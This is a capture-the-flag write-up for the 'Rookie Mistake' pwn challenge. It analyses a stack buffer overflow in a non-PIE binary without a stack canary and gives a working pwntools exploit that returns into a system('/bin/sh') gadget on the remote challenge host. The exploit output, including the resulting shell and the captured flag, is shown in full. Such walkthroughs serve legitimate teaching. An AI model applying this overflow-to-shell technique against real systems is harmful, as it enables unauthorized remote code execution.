# Rookie Mistake - PWN Challenge Writeup

## Challenge Information

- **Challenge Name:** Rookie Mistake
- **Category:** PWN (Binary Exploitation)
- **Points:** N/A
- **Difficulty:** Beginner/Intermediate
- **Flag:** `HTB{r3t2c0re_3sc4p3_th3_b1n4ry_bc3af7325b396b9dba6bd3fc3e5efa82}`

## Challenge Description

> Rook — the fearless, reckless hunter — has become trapped within the binary during his attempt to erase NEMEGHAST. To set him free, you must align the cores and unlock his path back to the light. Failing that… find another way. Bypass the mechanism. Break the cycle. 
> 
> **Objective:** Ret2win but not in a function, but a certain address.

**Connection Details:**
- Host: `46.101.224.18`
- Port: `32232`

## Initial Analysis

### Binary Information

```bash
$ file rookie_mistake
rookie_mistake: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
for GNU/Linux 3.2.0, not stripped
```

### Security Protections

Using `readelf` to analyze the binary:

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found    ← Vulnerable to buffer overflow
NX:         NX enabled
PIE:        No PIE (0x400000)  ← Fixed addresses
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

**Key Findings:**
- No stack canary - vulnerable to buffer overflow attacks
- No PIE - fixed memory addresses, making exploitation easier
- Not stripped - we can see function names

## Vulnerability Analysis

### Binary Structure

Using radare2 to analyze the binary:

```bash
$ r2 -qc "aaa; afl" rookie_mistake
```

**Key Functions Identified:**
- `main` - Entry point at `0x0040176b`
- `sym.overflow_core` - Contains the win condition at `0x00401672`
- `sym.check_core` - Core alignment check function
- `sym.info` - Info display function

### Main Function Analysis

```assembly
0x0040176b      f30f1efa       endbr64
0x0040176f      55             push rbp
0x00401770      4889e5         mov rbp, rsp
0x00401773      4883ec20       sub rsp, 0x20      ; Allocate 32 bytes for buffer
...
0x004017ab      488d45e0       lea rax, [buf]     ; buf at rbp-0x20
0x004017af      ba2e000000     mov edx, 0x2e      ; Read 46 bytes (0x2e)
0x004017b4      4889c6         mov rsi, rax
0x004017b7      bf00000000     mov edi, 0
0x004017bc      e88ff9ffff     call sym.imp.read  ; read(0, buf, 46)
```

**Vulnerability:** The program reads 46 bytes (`0x2e`) into a buffer located at `rbp-0x20` (32 bytes), allowing us to overflow 14 bytes.

### The Win Condition

Analyzing `sym.overflow_core`:

```assembly
0x00401758      488d054819..   lea rax, [0x004030a7]  ; "/bin/sh"
0x0040175f      4889c7         mov rdi, rax
0x00401762      e8b9f9ffff     call sym.imp.system    ; system("/bin/sh")
```

**Target Address:** `0x401758`

This is the "win gadget" that loads `/bin/sh` and calls `system()`. The challenge description hints at this: *"Ret2win but not in a function, but a certain address"* - we need to return to this specific address within the `overflow_core` function, not to the function itself.

## Exploitation

### Calculating the Offset

Buffer layout:
```
[32 bytes buffer] + [8 bytes saved RBP] + [8 bytes return address]
                    ↑
                    Offset = 40 bytes
```

With 46 bytes we can write:
- 40 bytes to fill buffer and saved RBP
- 6 bytes to partially overwrite the return address (enough for our target)

### Exploit Development

**exploit_remote.py:**

```python
#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64', os='linux')
context.log_level = 'info'

# Target binary
binary = './rookie_mistake'
elf = ELF(binary)

# Remote host details
REMOTE_HOST = '46.101.224.18'
REMOTE_PORT = 32232

# Win address - address of the gadget that calls system("/bin/sh")
# This is at 0x401758 in sym.overflow_core
win_addr = 0x401758

# Create the payload
# Buffer is at rbp-0x20 (32 bytes)
# Then 8 bytes for saved rbp
# Then 8 bytes for return address
# Total offset = 40 bytes to reach return address
offset = 40
payload = b'A' * offset
payload += p64(win_addr)

log.info(f"Payload length: {len(payload)}")
log.info(f"Win address: {hex(win_addr)}")
log.info(f"Offset: {offset}")

# Connect to remote
log.info(f"Connecting to remote: {REMOTE_HOST}:{REMOTE_PORT}")
io = remote(REMOTE_HOST, REMOTE_PORT)

# Receive banner
log.info("Receiving banner...")
print(io.recvuntil(b'$', timeout=2).decode(errors='ignore'))

# Send the payload
log.info("Sending payload...")
io.sendline(payload)

# Interact with the shell
log.success("Exploit sent! Dropping to interactive shell...")
io.interactive()
```

### Running the Exploit

```bash
$ python3 exploit_remote.py
[*] Payload length: 48
[*] Win address: 0x401758
[*] Offset: 40
[*] Connecting to remote: 46.101.224.18:32232
[+] Opening connection to 46.101.224.18 on port 32232: Done
[*] Receiving banner...
[*] Sending payload...
[+] Exploit sent! Dropping to interactive shell...
[*] Switching to interactive mode

$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
ctf
$ ls
core
flag.txt
rookie_mistake
$ cat flag.txt
HTB{r3t2c0re_3sc4p3_th3_b1n4ry_bc3af7325b396b9dba6bd3fc3e5efa82}
```

## Flag

```
HTB{r3t2c0re_3sc4p3_th3_b1n4ry_bc3af7325b396b9dba6bd3fc3e5efa82}
```

## Key Takeaways

1. **Classic Buffer Overflow:** The challenge demonstrates a classic stack-based buffer overflow vulnerability due to insufficient bounds checking.

2. **Ret2Win Variant:** Instead of returning to a function entry point, we return to a specific address within a function that contains the win condition.

3. **No Canary = Easy Exploitation:** The absence of stack canaries makes this exploitation straightforward once the offset is calculated.

4. **Fixed Addresses:** No PIE means we don't need to leak addresses or deal with ASLR.

## Tools Used

- **radare2/r2:** Binary analysis and disassembly
- **pwntools:** Exploit development and remote connection
- **Python 3:** Scripting the exploit

## References

- [pwntools Documentation](https://docs.pwntools.com/)
- [Buffer Overflow Basics](https://en.wikipedia.org/wiki/Buffer_overflow)
- [Return-to-libc Attack](https://en.wikipedia.org/wiki/Return-to-libc_attack)
